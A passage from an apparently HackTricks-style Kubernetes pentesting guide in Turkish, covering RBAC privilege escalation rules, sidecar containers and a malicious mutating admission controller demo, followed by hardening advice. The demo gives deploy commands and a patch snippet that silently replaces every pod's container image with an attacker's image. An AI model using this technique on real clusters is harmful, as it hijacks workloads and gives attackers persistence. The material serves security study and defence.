`nodes/status` veya `pods/status` üzerinde **`update`** veya **`patch`** izinlerine sahip ilkeler, uygulanan zamanlama kısıtlamalarını etkilemek için etiketleri değiştirebilir.

## Built-in Privileged Escalation Prevention

Kubernetes, ayrıcalık yükselmesini önlemek için [gömülü bir mekanizma](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) sunar.

Bu sistem, **kullanıcıların rollerini veya rol bağlamalarını değiştirerek ayrıcalıklarını artırmalarını** engeller. Bu kuralın uygulanması API seviyesinde gerçekleşir ve RBAC yetkilendiricisi devre dışı olduğunda bile bir koruma sağlar.

Kural, **bir kullanıcının yalnızca bir rolü oluşturabileceğini veya güncelleyebileceğini, eğer rolün içerdiği tüm izinlere sahipse** belirtir. Ayrıca, kullanıcının mevcut izinlerinin kapsamı, oluşturmak veya değiştirmek istediği rolün kapsamıyla uyumlu olmalıdır: ya ClusterRoles için küme genelinde ya da Roles için aynı ad alanında (veya küme genelinde).

> [!WARNING]
> Önceki kuralda bir istisna vardır. Eğer bir ilke **`roles`** veya **`clusterroles`** üzerinde **`escalate`** fiiline sahipse, kendisi izinlere sahip olmasa bile rollerin ve clusterrollerin ayrıcalıklarını artırabilir.

### **Get & Patch RoleBindings/ClusterRoleBindings**

> [!CAUTION]
> **Görünüşe göre bu teknik daha önce çalışıyordu, ancak testlerime göre önceki bölümde açıklanan aynı nedenle artık çalışmıyor. Eğer zaten izinleriniz yoksa, kendinize veya farklı bir SA'ya bazı ayrıcalıklar vermek için bir rolebinding oluşturamaz/değiştiremezsiniz.**

Rolebinding oluşturma ayrıcalığı, bir kullanıcının **rolleri bir hizmet hesabına bağlamasına** olanak tanır. Bu ayrıcalık, **kullanıcının ele geçirilmiş bir hizmet hesabına yönetici ayrıcalıkları bağlamasına** neden olabileceğinden, ayrıcalık yükselmesine yol açabilir.

## Other Attacks

### Sidecar proxy app

Varsayılan olarak, podlar arasındaki iletişimde herhangi bir şifreleme yoktur. Karşılıklı kimlik doğrulama, iki yönlü, poddan poda.

#### Create a sidecar proxy app

Bir sidecar konteyner, **bir podun içine ikinci (veya daha fazla) bir konteyner eklemekten** ibarettir.

Örneğin, aşağıdaki, 2 konteyner içeren bir podun yapılandırmasının bir parçasıdır:
```yaml
spec:
containers:
- name: main-application
image: nginx
- name: sidecar-container
image: busybox
command: ["sh","-c","<execute something in the same pod but different container>"]
```
Örneğin, mevcut bir pod'a yeni bir konteyner eklemek için spesifikasyona yeni bir konteyner ekleyebilirsiniz. İkinci konteynere, birincisinin sahip olmayacağı **daha fazla izin verebileceğinizi** unutmayın.

Daha fazla bilgi için: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Kötü Amaçlı Kabul Kontrolörü

Bir kabul kontrolörü, nesnenin kalıcı hale gelmeden önce Kubernetes API sunucusuna yapılan istekleri **yakalar**, ancak **istek kimlik doğrulandıktan ve yetkilendirildikten sonra**.

Bir saldırgan bir şekilde **bir Mutasyon Kabul Kontrolörü enjekte etmeyi** başarırsa, **zaten kimlik doğrulanmış istekleri değiştirme** yeteneğine sahip olacaktır. Potansiyel olarak yetki yükseltme yapabilir ve genellikle kümede kalıcı hale gelebilir.

**Örnek** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Durumunu kontrol et, hazır olup olmadığını görmek için:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format&format=webp)

Sonra yeni bir pod dağıtın:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
`ErrImagePull` hatasını gördüğünüzde, görüntü adını aşağıdaki sorgulardan biriyle kontrol edin:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Yukarıdaki görüntüde görebileceğiniz gibi, `nginx` imajını çalıştırmaya çalıştık ama son çalıştırılan imaj `rewanthtammana/malicious-image`. Ne oldu böyle!!?

#### Teknik Detaylar

`./deploy.sh` betiği, yapılandırma satırlarında belirtilen şekilde Kubernetes API'sine yapılan istekleri değiştiren bir mutasyona uğratan webhook admission controller'ı kurar ve gözlemlenen sonuçları etkiler:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Yukarıdaki kod parçası, her pod'daki ilk konteyner görüntüsünü `rewanthtammana/malicious-image` ile değiştirir.

## OPA Gatekeeper bypass

{{#ref}}
../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md
{{#endref}}

## En İyi Uygulamalar

### **Hizmet Hesabı Token'larının Automount'unu Devre Dışı Bırakma**

- **Pod'lar ve Hizmet Hesapları**: Varsayılan olarak, pod'lar bir hizmet hesabı token'ı monte eder. Güvenliği artırmak için, Kubernetes bu automount özelliğinin devre dışı bırakılmasına izin verir.
- **Uygulama Şekli**: Hizmet hesapları veya pod'ların yapılandırmasında `automountServiceAccountToken: false` ayarını yapın, Kubernetes sürüm 1.6'dan itibaren.

### **RoleBindings/ClusterRoleBindings'de Kısıtlayıcı Kullanıcı Ataması**

- **Seçici Dahil Etme**: RoleBindings veya ClusterRoleBindings'e yalnızca gerekli kullanıcıların dahil edildiğinden emin olun. Düzenli olarak denetim yapın ve alakasız kullanıcıları kaldırarak güvenliği sıkı tutun.

### **Namespace'e Özgü Roller Üzerine Cluster Genel Rolleri**

- **Roller vs. ClusterRoles**: Namespace'e özgü izinler için ClusterRoles ve ClusterRoleBindings yerine Roles ve RoleBindings kullanmayı tercih edin. Bu yaklaşım, daha ince kontrol sağlar ve izinlerin kapsamını sınırlar.

### **Otomatik Araçlar Kullanın**

{{#ref}}
https://github.com/cyberark/KubiScan
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-hunter
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-bench
{{#endref}}

## **Referanslar**

- [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
- [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)
- [**https://kubenomicon.com/Lateral_movement/CoreDNS_poisoning.html**](https://kubenomicon.com/Lateral_movement/CoreDNS_poisoning.html)
- [**https://kubenomicon.com/**](https://kubenomicon.com/)

{{#include ../../../banners/hacktricks-training.md}}
